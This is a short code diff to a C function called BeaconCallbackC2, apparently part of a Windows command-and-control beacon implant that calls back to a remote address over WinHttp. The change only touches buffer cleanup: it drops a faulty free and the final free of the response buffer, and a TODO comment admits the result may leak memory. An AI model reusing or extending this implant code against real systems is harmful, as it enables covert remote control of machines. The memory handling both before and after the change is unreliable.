@@ -533,12 +533,8 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
             }
             else
             {
-                tmp = &ResBuffer;
+                // TODO: test if this is leaking memory.
                 asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
-                // If ResBuffer was reallocated to fit pszOutBuffer free the previous chunk saved in tmp
-                if (tmp != &ResBuffer) {
-                    free(tmp);
-                }
             }
 
             // free the memory allocated to the buffer.
@@ -562,8 +558,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     }
     // Free ResBuffer json object
     json_object_put(parsed_json);
-    // Free ResBuffer
-    free(ResBuffer);
     // Cleanup handles
     rWinHttpCloseHandle(hRequest);
     rWinHttpCloseHandle(hSession);
